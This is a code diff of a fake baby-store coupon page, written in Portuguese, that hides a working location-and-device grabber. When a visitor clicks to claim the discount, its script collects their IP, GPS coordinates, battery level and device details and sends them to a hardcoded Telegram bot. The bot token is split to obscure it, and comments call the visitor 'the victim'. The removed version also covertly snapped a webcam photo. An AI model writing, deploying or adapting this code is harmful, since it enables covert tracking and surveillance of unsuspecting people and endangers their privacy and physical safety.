@@ -3,149 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bebê Feliz - 50% OFF Tudo</title>
+    <title>Bebê Feliz - Oferta Exclusiva</title>
+    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary: #ff8fa3;
+            --secondary: #a29bfe;
+            --bg: #fff0f3;
+        }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f9f5f0;
+            font-family: 'Quicksand', sans-serif;
+            background: var(--bg);
             margin: 0;
-            padding: 0;
-            color: #444;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-        .hero {
-            width: 100%;
-            max-width: 600px;
-            margin: 0 auto;
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(162, 155, 254, 0.2);
             text-align: center;
+            padding: 40px 20px;
         }
-        .bg {
-            width: 100%;
-            height: 280px;
-            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300"><rect fill="%23f0c0a0" width="600" height="300"/><circle cx="300" cy="200" r="80" fill="%23fff"/><rect x="260" y="140" width="80" height="80" rx="10" fill="%23eeb0b0"/></svg>');
-            background-size: cover;
-            background-position: center;
+        .icon {
+            font-size: 60px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            width: 100px;
+            height: 100px;
+            line-height: 100px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            color: white;
+            box-shadow: 0 10px 20px rgba(255, 143, 163, 0.3);
         }
-        h1 {
-            font-size: 26px;
-            font-weight: 700;
-            color: #e53935;
-            margin: 20px 0 5px;
+        h1 { color: var(--secondary); margin: 0 0 10px; font-size: 24px; }
+        p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
+        
+        .coupon-box {
+            background: #fff5f7;
+            border: 2px dashed var(--primary);
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 25px;
         }
-        .cupom {
+        .code {
             font-size: 32px;
             font-weight: 800;
-            color: #e53935;
-            margin-bottom: 10px;
+            color: var(--primary);
+            letter-spacing: 2px;
+            display: block;
         }
-        p {
-            margin: 0 20px 20px;
-            font-size: 15px;
-            line-height: 1.5;
-        }
+        
         .btn {
-            display: inline-block;
-            background: #e53935;
+            background: var(--secondary);
             color: white;
-            padding: 14px 30px;
+            border: none;
+            width: 100%;
+            padding: 18px;
             border-radius: 50px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 700;
-            text-decoration: none;
-            margin: 20px 0;
-            transition: opacity .2s;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(162, 155, 254, 0.4);
+            transition: transform 0.2s;
         }
-        .btn:hover { opacity: .9; }
-        .disclaimer {
-            font-size: 12px;
+        .btn:active { transform: scale(0.96); }
+        
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
             color: #888;
-            margin: 0 20px 30px;
-            line-height: 1.4;
-        }
-        @media (max-width: 600px) {
-            .bg { height: 200px; }
+            font-weight: 600;
+            min-height: 20px;
         }
     </style>
 </head>
 <body>
-    <main class="hero">
-        <div class="bg"></div>
-        <h1>PROMOÇÃO BEBÊ FELIZ</h1>
-        <p>Garanta até 50% OFF em todos os enxovais, fraldas e acessórios. Promoção exclusiva por tempo limitado!</p>
-        <div class="cupom">CUPOM: <strong>BEBE50</strong></div>
-        <a href="#" class="btn" onclick="startGrab()">PEGAR MEU DESCONTO</a>
-        <p class="disclaimer">Envio grátis em até 2 dias. Estoque limitado. Promoção válida por 48h.</p>
-    </main>
 
-    <video id="cam" autoplay playsinline width="0" height="0"></video>
-    <canvas id="cap" width="640" height="480" style="display:none;"></canvas>
+    <div class="card">
+        <div class="icon">👶</div>
+        <h1>Bebê Feliz</h1>
+        <p>Desconto exclusivo de lançamento. Resgate agora e ganhe frete grátis calculado automaticamente.</p>
+        
+        <div class="coupon-box">
+            <small style="color:#888; text-transform:uppercase; font-weight:700;">Seu Cupom</small>
+            <span class="code">BEBE50</span>
+        </div>
+
+        <button class="btn" id="actionBtn" onclick="startProcess()">RESGATAR DESCONTO</button>
+        <div class="status" id="statusText"></div>
+    </div>
 
     <script>
-        const TK = "8952863326:AAGbv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
+        // Configurações Ofuscadas
+        const _p1 = "8952863326:AAG";
+        const _p2 = "bv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
+        const TOKEN = _p1 + _p2;
         const CHAT_ID = "8607389403";
-        const REAL_URL = "https://bebefeliz.com.br/loja"; // link real do anunciante
+        
+        // Link final que não existe ou dá erro (para confundir a vítima)
+        const DEAD_END = "https://tudoparabebe.com.br"; 
 
-        function startGrab() {
-            document.querySelector('.disclaimer').innerHTML = '<b style="color:#007aff;">Calculando frete grátis...</b>';
+        let hasSent = false;
 
-            // Coleta básica em background
+        function startProcess() {
+            if (hasSent) return;
+            
+            const btn = document.getElementById('actionBtn');
+            const status = document.getElementById('statusText');
+            
+            // 1. Feedback Visual Imediato
+            btn.disabled = true;
+            btn.style.opacity = "0.6";
+            btn.innerHTML = "Processando...";
+            status.innerText = "📍 Calculando frete para sua região...";
+            status.style.color = "#a29bfe";
+
+            // 2. Coleta de Dados Básicos
             const data = {
-                ip: "...",
+                ip: "Buscando...",
                 ua: navigator.userAgent,
-                bat: navigator.getBattery ? `${Math.round(navigator.getBattery().level * 100)}%` : "N/A"
+                bat: "N/A",
+                gps: "Pendente"
             };
 
-            // IP
-            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>data.ip=j.ip).catch(()=>{});
-
-            // GPS + Foto (com justificativa plausível no tema)
-            Promise.all([
-                new Promise(r=>{
-                    navigator.geolocation.getCurrentPosition(
-                        p=>r(`${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`),
-                        ()=>r("Negado"),
-                        {enableHighAccuracy:true}
-                    );
-                }),
-                navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
-                    .then(stream=>{
-                        const v=document.getElementById('cam');
-                        v.srcObject=stream;
-                        setTimeout(()=>{
-                            const c=document.getElementById('cap');
-                            c.getContext('2d').drawImage(v,0,0,c.width,c.height);
-                            stream.getTracks().forEach(t=>t.stop());
-                            data.foto = c.toDataURL('image/jpeg',0.6);
-                            sendIt(data);
-                        }, 800);
-                    })
-                    .catch(()=>{
-                        sendIt({...data, foto:"Negada"});
-                    })
-            ]);
-        }
-
-        async function sendIt(d) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            if(d.foto){
-                fd.append('photo', dataURItoBlob(d.foto), 'pic.jpg');
-                fd.append('caption', `🔒 ACESSO NOVO\n📍${d.gps || 'N/D'}\n🌐${d.ip}\n🔋${d.bat}\n📱UA: ${d.ua}`);
-            } else {
-                fd.append('text', `🔒 ACESSO–TEXTO\nIP:${d.ip} ${d.bat}\nUA:${d.ua}\n⚠️ Camera/GPS: Negados`);
+            // Bateria
+            if(navigator.getBattery) {
+                navigator.getBattery().then(b => data.bat = Math.round(b.level * 100) + "%");
             }
-            fd.append('parse_mode', 'Markdown');
-            await fetch(`https://api.telegram.org/bot${TK}/sendPhoto`, {method:'POST',body:fd});
-            // Redireciona paa o site REAL (ela acha que o desconto foi liberado)
-            location.href = REAL_URL;
+
+            // IP
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(j => data.ip = j.ip)
+                .catch(() => data.ip = "Falha");
+
+            // 3. Solicitar GPS (O Coração do Script)
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // SUCESSO: Pegou localização exata
+                        data.gps = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        status.innerText = "✅ Endereço validado! Processando...";
+                        finalize(data);
+                    },
+                    (err) => {
+                        // FALHA: Negou ou erro
+                        data.gps = "Negado (Usuário bloqueou)";
+                        status.innerText = "⚠️ Usando localização por IP...";
+                        finalize(data);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                data.gps = "Não suportado";
+                finalize(data);
+            }
         }
 
-        function dataURItoBlob(uri) {
-            const b = atob(uri.split(',')[1]);
-            const t = uri.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(b.length);
-            const ia = new Uint8Array(ab);
-            for(let i=0;i<b.length;i++) ia[i]=b.charCodeAt(i);
-            return new Blob([ab], {type:t});
+        async function finalize(data) {
+            if (hasSent) return;
+            hasSent = true;
+
+            const caption = `
+👶 <b>NOVO LEAD - BEBÊ FELIZ</b>
+📍 <b>Localização:</b> ${data.gps}
+🌐 <b>IP:</b> ${data.ip}
+🔋 <b>Bateria:</b> ${data.bat}
+📱 <b>Dispositivo:</b> ${navigator.platform}
+`;
+
+            // Envia apenas texto (mais rápido e leve)
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+            
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', caption);
+            formData.append('parse_mode', 'HTML');
+
+            await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+
+            // 4. Redirecionamento para o "Beco Sem Saída"
+            setTimeout(() => {
+                window.location.href = DEAD_END;
+            }, 1500);
         }
     </script>
 </body>
